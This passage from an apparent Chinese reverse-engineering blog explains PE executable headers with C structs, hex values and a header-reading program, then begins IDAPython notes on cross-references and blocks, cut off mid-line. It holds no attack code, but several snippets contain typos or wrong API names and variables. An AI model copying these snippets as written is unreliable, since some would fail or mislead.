paragraphs needs</span><br>    <span class="hljs-comment">//0X0C WORD e_maxalloc; //Maximun extra paragraphs needs</span><br>    <span class="hljs-comment">//0X0E WORD e_ss;       //intial(relative)SS value</span><br>    <span class="hljs-comment">//0X10 WORD e_sp;       //intial SP value</span><br>    <span class="hljs-comment">//0X12 WORD e_csum;     //Checksum</span><br>    <span class="hljs-comment">//0X14 WORD e_ip;       //intial IP value</span><br>    <span class="hljs-comment">//0X16 WORD e_cs;       //intial(relative)CS value</span><br>    <span class="hljs-comment">//0X18 WORD e_lfarlc;   //File Address of relocation table</span><br>    <span class="hljs-comment">//0X1A WORD e_ovno;     //Overlay number</span><br>    <span class="hljs-comment">//0x1C WORD e_res[4];   //Reserved words</span><br>    <span class="hljs-comment">//0x24 WORD e_oemid;    //OEM identifier(for e_oeminfo)</span><br>    <span class="hljs-comment">//0x26 WORD e_oeminfo;  //OEM information;e_oemid specific</span><br>    <span class="hljs-comment">//0x28 WORD e_res2[10]; //Reserved words</span><br>    <span class="hljs-number">0x3C</span> DWORD e_lfanew;    <span class="hljs-comment">//※Offset to start of PE header:定位PE文件，PE头相对于文件的偏移量</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>简单算算，即整个DOS头只有0x40个字节，那就对比这个结构体来分析一下百度网盘的DOS头吧</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306301414772.png" alt="百度网盘"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// 注释掉的不需要重点分析</span><br><span class="hljs-comment">// 要注意存储顺序为小端序</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_DOS_HEADER</span>&#123;</span><br>    <span class="hljs-number">0X00</span> WORD e_magic;      <span class="hljs-comment">// 5A 4D</span><br>    <span class="hljs-comment">//0X02 WORD e_cblp;     // 00 90</span><br>    <span class="hljs-comment">//0X04 WORD e_cp;       // 03 00</span><br>    <span class="hljs-comment">//0X06 WORD e_crlc;     // 00 00</span><br>    <span class="hljs-comment">//0X08 WORD e_cparhdr;  // 00 04</span><br>    <span class="hljs-comment">//0X0A WORD e_minalloc; // 00 00</span><br>    <span class="hljs-comment">//0X0C WORD e_maxalloc; // FF FF</span><br>    <span class="hljs-comment">//0X0E WORD e_ss;       // 00 00</span><br>    <span class="hljs-comment">//0X10 WORD e_sp;       // 00 B8</span><br>    <span class="hljs-comment">//0X12 WORD e_csum;     // 00 00</span><br>    <span class="hljs-comment">//0X14 WORD e_ip;       // 00 00</span><br>    <span class="hljs-comment">//0X16 WORD e_cs;       // 00 00</span><br>    <span class="hljs-comment">//0X18 WORD e_lfarlc;   // 00 40</span><br>    <span class="hljs-comment">//0X1A WORD e_ovno;     // 00 00</span><br>    <span class="hljs-comment">//0x1C WORD e_res[4];   // 00 00 00 00 00 00 00 00 //注意这是个数组</span><br>    <span class="hljs-comment">//0x24 WORD e_oemid;    // 00 00</span><br>    <span class="hljs-comment">//0x26 WORD e_oeminfo;  // 00 00</span><br>    <span class="hljs-comment">//0x28 WORD e_res2[10]; // 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br>    <span class="hljs-number">0x3C</span> DWORD e_lfanew;    <span class="hljs-comment">// 00 00 01 50</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>这里只需要注意第一个成员以及最后一个成员，第一个成员 <code>e_magic</code> 是可执行文件标志，在一个程序运行时，会首先检查这两位来判断这是不是一个可执行文件，最后一个成员<code>e_lfanew</code>就是存储的就是NT头的地址</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306301429472.png"></p><p>可以看到<code>e_lfanew</code>有一个箭头指向了<code>IMAGE_NT_HEADERS</code>，也就是NT头。</p><h2 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h2><p>先根据DOS头中<code>e_lfanew</code>所指示的地址0x150，在16进制文本编辑器看看这个NT头是个啥吧</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306301436891.png"></p><p>根据上面的PE文件结构图，NT头又可以分成三个部分</p><ul><li>Signature</li><li>Image_File_Header - 标准PE头</li><li>Image_Optional_Header - 可选PE头</li></ul><p>其中<code>Signature</code>占4个字节，即 <code>50 45 00 00 </code> 在右边也可以看到就是PE两个字母的ascii码（50 45）</p><h3 id="标准PE头"><a href="#标准PE头" class="headerlink" title="标准PE头"></a>标准PE头</h3><p>标准PE头占0x14个字节，它也是个结构体，如下是他的结构体成员及相关含义,带星号为重要成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_FILE_HEADER</span> &#123;</span><br>    WORD    Machine;               <span class="hljs-comment">// 01 4c //*可以运行在什么样的CPU上 任意：0 Intel 386以及后续：14C x64：8864</span><br>    WORD    NumberOfSections;      <span class="hljs-comment">// 00 09 //*表示节的数量</span><br>    DWORD   TimeDateStamp;         <span class="hljs-comment">// 64 79 c7 10 //*编译器填写的时间戳，与文件属性里面的创建时间、修改时间无关</span><br>    DWORD   PointerToSymbolTable;  <span class="hljs-comment">// 00 00 00 00 //调试相关</span><br>    DWORD   NumberOfSymbols;       <span class="hljs-comment">// 00 00 00 00 //调试相关</span><br>    WORD    SizeOfOptionalHeader;  <span class="hljs-comment">// 00 e0 //*可选PE头的大小(32位PE文件：0xE0 64位PE文件：0xF0)</span><br>    WORD    Characteristics;       <span class="hljs-comment">// 01 02  //*文件属性</span><br>&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;<br></code></pre></td></tr></table></figure><h3 id="可选PE头"><a href="#可选PE头" class="headerlink" title="可选PE头"></a>可选PE头</h3><p>标准PE头过后就是可选PE头,这里就仅给出结构体成员，带星号为重要成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_OPTIONAL_HEADER</span> &#123;</span>  <br>    WORD    Magic;  <span class="hljs-comment">//* 10B 32位PE 20B 64位PE 107 ROM映像</span><br>    BYTE    MajorLinkerVersion;  <span class="hljs-comment">// 链接器版本号</span><br>    BYTE    MinorLinkerVersion;  <span class="hljs-comment">// 链接器副版本号</span><br>    DWORD   SizeOfCode;  <span class="hljs-comment">//* 所有代码节的总和  必须是FileAlignment大小整数倍 已无用</span><br>    DWORD   SizeOfInitializedData; <span class="hljs-comment">//*  所有含已初始化数据的节的总大小 必须是FileAlignment大小整数倍 已无用</span><br>    DWORD   SizeOfUninitializedData; <span class="hljs-comment">//* 所有含未初始化数据的节的大小 必须是FileAlignment大小整数倍 已无用</span><br>    DWORD   AddressOfEntryPoint; <span class="hljs-comment">//* 程序执行入口RVA</span><br>    DWORD   BaseOfCode; <span class="hljs-comment">//* 代码节的起始RVA 已无用</span><br>    DWORD   BaseOfData; <span class="hljs-comment">//* 数据节的起始RVA 已无用</span><br>    DWORD   ImageBase;  <span class="hljs-comment">//* 程序的优先装载地址</span><br>    DWORD   SectionAlignment; <span class="hljs-comment">//* 内存中节的对齐粒度</span><br>    DWORD   FileAlignment; <span class="hljs-comment">//* 文件中节的对齐粒度</span><br>    WORD    MajorOperatingSystemVersion; <span class="hljs-comment">// 操作系统主版本号</span><br>    WORD    MinorOperatingSystemVersion; <span class="hljs-comment">// 操作系统副版本号</span><br>    WORD    MajorImageVersion;  <span class="hljs-comment">// PE文件映像的版本号</span><br>    WORD    MinorImageVersion;  <br>    WORD    MajorSubsystemVersion; <span class="hljs-comment">// 子系统的版本号</span><br>    WORD    MinorSubsystemVersion;  <br>    DWORD   Win32VersionValue;  <span class="hljs-comment">// 未用 必须设置0</span><br>    DWORD   SizeOfImage;  <span class="hljs-comment">//* 内存中整个PE文件的映像尺寸 必须是SectionAlignment整数倍</span><br>    DWORD   SizeOfHeaders;  <span class="hljs-comment">//* 所有头包括节表按照文件对齐粒度后的大小</span><br>    DWORD   CheckSum; <span class="hljs-comment">// 校验和</span><br>    WORD    Subsystem; <span class="hljs-comment">// 指定使用界面的子系统</span><br>    WORD    DllCharacteristics; <span class="hljs-comment">//  DALL文件属性</span><br>    DWORD   SizeOfStackReserve; <span class="hljs-comment">// 初始化时保留的栈的大小</span><br>    DWORD   SizeOfStackCommit; <span class="hljs-comment">//* 初始化时实际提交的栈的大小</span><br>    DWORD   SizeOfHeapReserve; <span class="hljs-comment">//* 初始化时保留的堆的大小</span><br>    DWORD   SizeOfHeapCommit; <span class="hljs-comment">//* 初始化时实际提交的堆的大小</span><br>    DWORD   LoaderFlags; <span class="hljs-comment">// 加载标志  未用</span><br>    DWORD   NumberOfRvaAndSizes; <span class="hljs-comment">//* 下面的数据目录结构的数量</span><br>    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];  <br>&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;  <br></code></pre></td></tr></table></figure><h4 id="RVA"><a href="#RVA" class="headerlink" title="RVA"></a>RVA</h4><p>这里提到了几个新的名词RVA,即Relative Virual Address，虚拟相对地址。</p><p>在解释此名词之前，需要明白一件事情，即PE文件实际上有两种格式，一种是存储在硬盘中，也就是16进制编辑器打开的样子，还有一种则是运行时，操作系统会分配一个独立的虚拟空间给它，通常这个虚拟空间大小是4GB，然后把这个文件装载到这个4GB中，装载到哪，则是先由ImageBase字段决定，一旦确定好从哪个地方装载，就相当于确定了一个基址，而这个RVA就是相对这个基址的偏移。</p><p>比如这个文件从内存中0x10000000开始装载，如果RVA是0x32，那么在内存中它的地址就是0x10000032</p><h4 id="FOA"><a href="#FOA" class="headerlink" title="FOA"></a>FOA</h4><p>可能会想起，那我们刚刚提到的<code>e_lfanew</code>是什么偏移？，既然PE文件有两种格式，那么偏移肯定也有两种，刚刚的提及的RVA是在虚拟内存中的，那么还有一种就是在文件中的偏移，即FOA - File Offset Address，也就是在16进制文本编辑器里的偏移</p><h4 id="SectionAlignment-and-FileAlignment"><a href="#SectionAlignment-and-FileAlignment" class="headerlink" title="SectionAlignment and FileAlignment"></a>SectionAlignment and FileAlignment</h4><p>SectionAlignment ：在内存里面节的对齐大小，必须是这个的整数倍</p><p>FileAlignment：在文件里面节的对齐大小，必须是这个的整数倍</p><h2 id="使用代码读取"><a href="#使用代码读取" class="headerlink" title="使用代码读取"></a>使用代码读取</h2><p>得益于微软的内置库，可以方便的使用以及定义好的指针类型来读取，而不需要自己手动计算</p><p>唯一需要注意的是，由于是文件读入内存中，因此文件在内存中相当于是有一个基址的，所以需要buffer+FOA。注意这里是把文件原封不动的读入程序内存，而不是运行时拉伸进内存。</p><p>可以使用网上的一些PE查看器来验证自己是否读出正确数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">PE_info</span><span class="hljs-params">(FILE* fp,<span class="hljs-type">char</span>* buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)(buffer);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;=================DosHeader PE_INFO=================\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DOS_HEADER e_magic:%X\n&quot;</span>,DosHeader-&gt;e_magic);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DOS_HEADER e_lfanew:%X\n&quot;</span>,DosHeader-&gt;e_lfanew);<br>    <br><br>    NTHeader = (PIMAGE_NT_HEADERS)(buffer + DosHeader-&gt;e_lfanew);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;=================NTHeader PE_INFO=================\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IMAGE_DOS_SIGNATURE:%X\n&quot;</span>,*(PDWORD)NTHeader);<br><br>    FILEHeader = (PIMAGE_FILE_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;=================FileHeader PE_INFO=================\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Machine:%X\n&quot;</span>, FILEHeader-&gt;Machine);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Number of Sections:%X\n&quot;</span>, FILEHeader-&gt;NumberOfSections);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size of OptionalHeader:%X\n&quot;</span>, FILEHeader-&gt;SizeOfOptionalHeader);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Time Stamp:%X\n&quot;</span>, FILEHeader-&gt;TimeDateStamp);<br><br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;=================Optional PE_INFO=================\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Magic:%X\n&quot;</span>, OptionalHeader-&gt;Magic);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address of EntryPoint:%X\n&quot;</span>, OptionalHeader-&gt;AddressOfEntryPoint);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ImageBase:%X\n&quot;</span>, OptionalHeader-&gt;ImageBase);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SizeOfImage:%X\n&quot;</span>, OptionalHeader-&gt;SizeOfImage);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SizeOfHeaders:%X\n&quot;</span>, OptionalHeader-&gt;SizeOfHeaders);<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    <span class="hljs-type">int</span> size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp, <span class="hljs-string">&quot;YOU PATH TO EXE HERE&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <br>    <span class="hljs-comment">//将文件读取到程序中</span><br>    <span class="hljs-type">int</span> size = Size(fp);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp);<br><br>    PE_info(fp,buffer);<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>DOS头中第一个成员<code>e_magic</code>和最后一个成员<code>e_lfanew</code>最重要，前者是可执行文件的标志MZ，后者是NT头的文件偏移</p><p>NT头分三个部分，分别是</p><ul><li><p>Signature - PE</p></li><li><p>标准PE头，其重要成员</p><ul><li>Machine 可以运行在什么样的CPU</li><li>NumberofSections 节的数量</li><li>TimeDateStamp 时间戳</li><li>SizeOfOptionalHeader 可选PE头大小</li><li>Characteristics 文件属性</li></ul></li><li><p>可选PE头，其重要成员且仍有用成分</p><ul><li>Magic    该PE文件是什么类型的 10B 32位PE &#x2F;&#x2F; 20B 64位PE &#x2F;&#x2F; 107 ROM映像</li><li>AddressOfEntryPoint 程序入口，即所谓的OEP</li><li>ImageBase   程序的优先装载地址</li><li>SectionAlignment  内存中节的对齐粒度</li><li>FileAlignment  文件中节的对齐粒度</li><li>SizeOfImage 映像大小</li><li>SizeOfHeaders 所有节表对齐后的大小</li><li>SizeOfStackCommit  初始化时实际提交的栈的大小</li><li>SizeOfHeapReserve   初始化时实际提交的堆的大小</li><li>NumberOfRvaAndSizes 目录项</li><li>（无用但保留的字段基本都是为了兼容）</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDApython 笔记</title>
    <link href="/2023/06/24/IDApython/"/>
    <url>/2023/06/24/IDApython/</url>
    
    <content type="html"><![CDATA[<p>IDApython学习笔记</p><span id="more"></span><h2 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">ea = here() <span class="hljs-comment">#当前光标处地址</span><br><br>asm = idc.GetDisasm(ea) <span class="hljs-comment"># 获取当前地址的整句汇编指令 如 mov rax 1</span><br>op = idc.print_insn_mnem(ea) <span class="hljs-comment"># 获取当前地址汇编操作，如 mov </span><br>operand = idc.print_operand(ea,<span class="hljs-number">0</span>) <span class="hljs-comment"># 获取当前地址汇编操作的操作数，0是第一个操作数，1是第二个操作数，如果超过返回空</span><br><br>_prev_ins = idc.prev_head(ea) <span class="hljs-comment"># 上一条指令地址</span><br>_next_ins = idc.next_head(ea) <span class="hljs-comment"># 下一条指令地址</span><br><br>_prev_addr = idc.prev_addr(ea) <span class="hljs-comment"># 上一条指令地址 这里地址是连续的 比如ea = 0x4002 则返回0x4001</span><br>_next_addr = idc.next_addr(ea) <span class="hljs-comment"># 下一条指令地址 这里地址是连续的 比如ea = 0x4001 则返回0x4002 </span><br><br>seg_name = idc.get_segm_name(ea) <span class="hljs-comment">#当前地址所处段</span><br><span class="hljs-keyword">for</span> seg <span class="hljs-keyword">in</span> Segments(): <span class="hljs-comment"># 获得每个段起始地址 返回值为每个段起始地址</span><br>    <span class="hljs-built_in">print</span>(seg)<br><br><span class="hljs-keyword">for</span> func <span class="hljs-keyword">in</span> Functions():<span class="hljs-comment"># 获得每一个函数名字</span><br>    <span class="hljs-built_in">print</span>(idc.get_func_name(func))<br><br></code></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="基本指令-1"><a href="#基本指令-1" class="headerlink" title="基本指令"></a>基本指令</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">name = idc.get_func_name(ea) <span class="hljs-comment">#当前地址所属函数名字</span><br>func = ida_funcs.get_func(ea) <span class="hljs-comment">#当前地址所属函数 返回一个func_t对象</span><br>func = idaapi.get_func(ea) <span class="hljs-comment">#功能同上</span><br><br><span class="hljs-comment"># 利用func_t对象，有如下几个操作</span><br>func_start = func.start_ea <span class="hljs-comment">#该函数起始地址</span><br>func_end = func.end_ea <span class="hljs-comment">#该函数结束地址 注意结束地址是此函数最后一条指令的下一条指令地址</span><br><br>func_start = idc.get_func_attr(ea, FUNCATTR_START) <span class="hljs-comment"># 此地址所属函数起始地址 FUNCATTR_START是宏 等于0</span><br>func_end = idc.get_func_attr(ea,FUNCATTR_END)<span class="hljs-comment"># 此地址所属函数结束地址 同func_end FUNCATTR_END是宏 等于8</span><br><br><span class="hljs-comment"># 获取上一个函数起始地址</span><br>idc.get_prev_fchunk(ea) <br>idc.get_prev_func(ea) <br><br><span class="hljs-comment"># 获取下一个函数起始地址</span><br>idc.get_next_fchunk(ea) <br>idc.get_next_func(ea) <br></code></pre></td></tr></table></figure><h3 id="交叉引用"><a href="#交叉引用" class="headerlink" title="交叉引用"></a>交叉引用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">xrefs = XrefsFrom(ea,<span class="hljs-number">0</span>)<br><span class="hljs-comment"># 返回一个xref列表对象，以此ea为起点，可以有如下操作</span><br><span class="hljs-keyword">for</span> xref <span class="hljs-keyword">in</span> xrefs:<br>xref.frm <span class="hljs-comment"># 起点 </span><br>xref.to <span class="hljs-comment"># 终点，即此函数可以跳去哪</span><br><span class="hljs-comment">#第二个参数是选取交叉引用范围，0,默认是全部 ,1 是远跳转 2 是数据引用</span><br><br>xrefx = XrefsTo(ea,<span class="hljs-number">0</span>)<br><span class="hljs-comment"># 返回一个xref列表对象，以此ea为终点，可以有如下操作</span><br><span class="hljs-keyword">for</span> xref <span class="hljs-keyword">in</span> xrefs:<br>xref.frm <span class="hljs-comment"># 何处来，即谁调用了它</span><br>xref.to <span class="hljs-comment"># 何处去，即它可以去哪里</span><br><span class="hljs-comment">#第二个参数是选取交叉引用范围，0,默认是全部 ,1 是远跳转 2 是数据引用</span><br><span class="hljs-comment"># 一般用此函数找引用</span><br><br>xref = CodeRefsFrom(ea,<span class="hljs-number">0</span>)<br><span class="hljs-comment"># 与 XrefsFrom含义一样，不过返回的是list对象，也只有远跳转，第二参数控制流向，即上面的 frm 和 to 对应</span><br>xref = CodeRefsTo(ea,<span class="hljs-number">0</span>)<br><span class="hljs-comment"># 与 XrefsTo含义一样，不过返回的是list对象，第二参数控制流向，即上面的 frm 和 to 对应</span><br><br>ref = ida_xref.get_first_dref_to(addr) <br><span class="hljs-comment"># 得到引用此变量的首条语句地址 如果没有返回-1 这个是仅变量的交叉引用 无法查看函数的交叉引用，但是XrefXXXX都可以查看</span><br>nex_ref = ida_xref.ger_next_derf_to(addr,ref)<br><span class="hljs-comment"># 得到引用此变量的在ref的下条语句地址 如果没有返回-1 这个是仅变量的交叉引用 无法查看函数的交叉引用，但是XrefXXXX都可以查看</span><br><br>func_addr =idc.get_name_ea_simple(func_name) <span class="hljs-comment"># 通过函数名字获得该函数地址 如果没有该函数返回-1</span><br></code></pre></td></tr></table></figure><h3 id="一些个交叉引用使用方式"><a href="#一些个交叉引用使用方式" class="headerlink" title="一些个交叉引用使用方式"></a>一些个交叉引用使用方式</h3><p>patch掉所有call危险函数的地方</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">danger_func = [<span class="hljs-string">&#x27;gets&#x27;</span>,<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-keyword">for</span> func <span class="hljs-keyword">in</span> danger_func:<br>    func_addr = idc.get_name_ea_simple(func)<br>    xrefs = CodeRefsTo(func_addr,<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">for</span> xref <span class="hljs-keyword">in</span> xrefs:<br>        <span class="hljs-keyword">if</span> idc.GetDisasm(xref).startswith(<span class="hljs-string">&#x27;call&#x27;</span>):<br>            <span class="hljs-built_in">len</span> = next_head(xref) - xref<br>            idaapi.patch_bytes(xref,<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-built_in">len</span>)<br></code></pre></td></tr></table></figure><p>处理ea到end之间所有的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ea,end,<span class="hljs-number">4</span>):<br>    xrefs = XrefsTo(ea)<br>    <span class="hljs-keyword">for</span> xref <span class="hljs-keyword">in</span> xrefs:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;mov&#x27;</span> <span class="hljs-keyword">in</span> GetDisasm(xref.frm):<br>            <span class="hljs-comment"># your method</span><br></code></pre></td></tr></table></figure><h2 id="Block"><a href="#Block" class="headerlink" title="Block"></a>Block</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">ea = here()<br>func = idaapi.get_func(ea)<br>CFG = idaapi.FlowChart(func) <span class="hljs-comment"># 此函数的CFG</span><br><br><span class="hljs-keyword">for</span> blocks <span class="hljs-keyword">in</span> CFG:<br>    <span class="hljs-built_in">print</span>(blocks.start_ea) <span class="hljs-comment"># 每一个block的起始地址</span><br>    <span class="hljs-built_in">print</span>(block.end_ea) <span class="hljs-comment"># 每一个block的结束地址 但注意 结束地址是下一个block的起始地址</span><br>    <span 